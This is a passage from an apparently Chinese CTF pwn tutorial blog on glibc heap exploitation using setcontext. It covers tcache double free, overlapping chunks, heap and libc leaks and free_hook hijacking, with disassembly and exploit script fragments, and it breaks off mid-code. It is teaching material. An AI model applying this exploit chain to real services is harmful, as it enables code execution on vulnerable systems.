&lt;span class=&#34;number&#34;&gt;62&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;             mov    r12,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x48&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580f&lt;/span&gt;3:       &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;c &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;a &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;             mov    r13,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580f&lt;/span&gt;7:       &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;c &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;58&lt;/span&gt;             mov    r14,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x58&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580f&lt;/span&gt;b:       &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;c &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;a &lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;             mov    r15,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;580f&lt;/span&gt;f:       &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt; f7 &lt;span class=&#34;number&#34;&gt;04&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;25&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;    test   DWORD PTR fs:&lt;span class=&#34;number&#34;&gt;0x48&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;58106&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;02&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;5810b&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;0f&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;84&lt;/span&gt; b5 &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;       je     &lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;c6 &amp;lt;setcontext@@GLIBC_2&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.5&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x126&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ........................&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;c6:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;a a8 &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;    mov    rcx,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0xa8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;cd:       &lt;span class=&#34;number&#34;&gt;51&lt;/span&gt;                      push   rcx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;ce:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;70&lt;/span&gt;             mov    rsi,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;d2:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;a &lt;span class=&#34;number&#34;&gt;68&lt;/span&gt;             mov    rdi,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;d6:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;a &lt;span class=&#34;number&#34;&gt;98&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;    mov    rcx,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;dd:       &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;c &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;42&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;             mov    r8,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581e1&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;c &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;a &lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;             mov    r9,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581e5&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;8b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;92&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;88&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;    mov    rdx,QWORD PTR [rdx+&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;ec:       &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt; c0                   xor    eax,eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;581&lt;/span&gt;ee:       c3                      ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	能看到这里有两个重点，一个是mov    rsp,QWORD PTR [rdx+0xa0]，另外一个是mov    rcx,QWORD PTR [rdx+0xa8]；push   rcx&lt;/p&gt;
&lt;p&gt;​	从这里可以看出，如果能控制rdx及其所在区域（比如一个chunk），那么就可以控制rsp，rcx，然后ret到rsp所在区域继续执行。&lt;/p&gt;
&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;问题就转换为了如何控制rdx&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&#34;特殊gadget&#34;&gt;&lt;a href=&#34;#特殊gadget&#34; class=&#34;headerlink&#34; title=&#34;特殊gadget&#34;&gt;&lt;/a&gt;特殊gadget&lt;/h3&gt;&lt;p&gt;libcbase + 0x1547a0&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mov rdx, qword ptr [rdi + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]   # 设置rdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;]    # 填入setcontext gadget的地址&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	所以可以先想办法控制rdi及其所在区域，然后跳转到setcontext （伪造或者定制一个特殊的chunk即可）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130163535913.png&#34; alt=&#34;image-20240130163535913&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130163606558.png&#34; alt=&#34;image-20240130163606558&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;三、利用步骤&#34;&gt;&lt;a href=&#34;#三、利用步骤&#34; class=&#34;headerlink&#34; title=&#34;三、利用步骤&#34;&gt;&lt;/a&gt;三、利用步骤&lt;/h1&gt;&lt;h2 id=&#34;1-泄露地址&#34;&gt;&lt;a href=&#34;#1-泄露地址&#34; class=&#34;headerlink&#34; title=&#34;1.泄露地址&#34;&gt;&lt;/a&gt;1.泄露地址&lt;/h2&gt;&lt;h3 id=&#34;泄露堆地址&#34;&gt;&lt;a href=&#34;#泄露堆地址&#34; class=&#34;headerlink&#34; title=&#34;泄露堆地址&#34;&gt;&lt;/a&gt;泄露堆地址&lt;/h3&gt;&lt;p&gt;​		利用tcache的double free，free进到tcache是不做检查的，所以才要先add一下，让tcache有一个空位&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130155607450.png&#34; alt=&#34;image-20240130155607450&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130155547108.png&#34; alt=&#34;image-20240130155547108&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		当第二次free(8)的时候，8已经被free两次了其实，一次在usbin中，一次在tcache中&lt;/p&gt;
&lt;p&gt;​		这里&lt;font color=&#34;red&#34;&gt;继续add(0,1,’1’)&lt;/font&gt; 占据的是0号的chunk_list,这里申请到的是tcache中的8，bb20。 如此一来，chunk_list的0号和8号都是一个chunk了,&lt;font color=&#34;red&#34;&gt; 这样一个free后,另一个就可以show来泄露信息&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123154856126-6610301.png&#34; alt=&#34;image-20240123154856126&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		然后继续free(8), 虽然8不能show，但这时候0是可以show的，所以show 0就得到了泄露的堆地址		&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# ----------------------------- &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; 利用&lt;span class=&#34;type&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;构造堆块重叠， 泄露heap和libc地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;title function_&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(i,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;title function_&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;:    # 填充满tcache &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;-i)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 合并进入usbin， 先8后7，反过来呢？ 没影响 这俩合并在一起。 目的其实是后面可以单独操纵其中一块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 从tcache中取出第一块分配， tcache后进先出， 所以分配的是0号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 这里用到了&lt;span class=&#34;type&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;，将合并状态下的一部分chunk放入tcache，造成堆块重叠（谁和谁重叠呢？ tcache的第一个和usbin的？&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt; # 为啥这里能再次&lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;呢？ &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;进tcahe，所以前面用到了一个add。。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;# 再次申请，使放入tcache中的usbin chunk被分配（8号），泄露堆地址（为什么还是可以0呢？编号是可以覆盖的，但是实际上还是要创建新的内存&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;   # 继续&lt;span class=&#34;type&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; 这里会填入地址啦，就是从这里泄露的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;  # 为什么不能show 8呢 要检测chunk_list_flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;ru&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nder: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = uu64(r(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak(heap_addr)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;泄露libc地址&#34;&gt;&lt;a href=&#34;#泄露libc地址&#34; class=&#34;headerlink&#34; title=&#34;泄露libc地址&#34;&gt;&lt;/a&gt;泄露libc地址&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;    把tcache都申请了，然后把unsortedbin再申请一半，剩下的一半的fd和bk就是main_arena的地址了
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​		记住这里申请的1的话也是bb20，就是那个uaf的堆块，这样的话，0 1都是它了，然后show 0 (1也行)就能show出来usbin的bk，也就能泄露堆地址了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;title function_&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(i,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,str(i)+str(i))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;ru&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nder: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base = uu64(r(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;))&lt;span class=&#34;number&#34;&gt;-0x1ebbe0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak(base)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;2-在堆块上布置-触发-setcontext链的-gadget及setcontext用到的数据&#34;&gt;&lt;a href=&#34;#2-在堆块上布置-触发-setcontext链的-gadget及setcontext用到的数据&#34; class=&#34;headerlink&#34; title=&#34;2. 在堆块上布置 触发 setcontext链的 gadget及setcontext用到的数据&#34;&gt;&lt;/a&gt;2. 在堆块上布置 触发 setcontext链的 gadget及setcontext用到的数据&lt;/h2&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130182255242.png&#34; alt=&#34;image-20240130182255242&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;h3 id=&#34;原理&#34;&gt;&lt;a href=&#34;#原理&#34; class=&#34;headerlink&#34; title=&#34;原理&#34;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;​	因为是第一次使用这个手法,看原文wp很蒙, 但结合后面的步骤就理解了.&lt;/p&gt;
&lt;p&gt;​	其实这里就是要布置一下触发free_hook之后的行为,让它设置好rdx后把控制流转到setcontext, 我们是把free_hook修改为了这个gadget&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mov rdx, qword ptr [rdi + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	于是乎,在free触发的时候，传入的第一个参数rdi是 要free的chunk的地址 &lt;/p&gt;
&lt;p&gt;​	所以就是把chunk+8处的值传给rdx，也就是heap_addr+0x3a8-0x18，然后把heap_addr+0x3a8-0x18+0x20处的值，当作函数的地址进行调用, 在知道chunk地址的前提下,rdi+8可控的话,rdx+0x20的值也是可控的,&lt;/p&gt;
&lt;p&gt;​	然后跳到setcontext之后，还是以这个chunk为基础进行设置值，在setcontext中，用到了0xa0和0xa8,分别代表了rsp和ret后的第一条指令。&lt;/p&gt;
&lt;p&gt;​	所以最终会布置成这个样子&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240130152108965.png&#34; alt=&#34;image-20240130152108965&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;实现步骤&#34;&gt;&lt;a href=&#34;#实现步骤&#34; class=&#34;headerlink&#34; title=&#34;实现步骤&#34;&gt;&lt;/a&gt;实现步骤&lt;/h3&gt;&lt;p&gt;​	这里的目标是修改一个堆块的gender(chunk+8),虽然有666那个地方可以修改,但还是先用复杂一点的方法来. 如果要修改的话,就需要进行一个任意地址写,所以可以通过tcache poison (类似于double free) 申请到一个堆头前面的地址,然后来实现修改gender的效果&lt;/p&gt;
&lt;p&gt;​	这里的目标就是修改fd，把fd修改为要修改gender堆块的上面的地址&lt;/p&gt;
&lt;p&gt;​	free(3)  上面的一个堆块，不知道为啥要选定这个（大概可以随便选一个，和0x380对应就行）&lt;/p&gt;
&lt;p&gt;​	free(1)  1指向的堆块其实是bb20，也就是前面一直利用的覆盖的那半个220的堆块 ，这里用到了uaf，0的位置也是bb20，这时候编辑它，修改了fd （&lt;font color=&#34;red&#34;&gt;这里可见，chunk_list的0和1都是这个块，造成uaf&lt;/font&gt;）&lt;/p&gt;
&lt;p&gt;​	然后两次add，就让9获得了要伪造堆块的地址（ 为什么不直接在这里获取free_hook呢？ 为什么要在这里伪造堆块呢？）（&lt;font color=&#34;red&#34;&gt;因为要修改bk，也就是rdi+8这个位置，作者这样弄其实是复杂了，虽然很通用，其实题目给出了一次修改性别的机会，估计就是用来干这个的&lt;/font&gt;)&lt;/p&gt;
&lt;p&gt;​	然后布置好chunk+8以及chunk+8所指向的地址的内容( 那个特殊的gadget		&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# ----- &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; 构造堆块重叠，使得可以向chunk+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;位置写入数据；令在堆块上布置 跳往 setcontext链 的gadget&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span 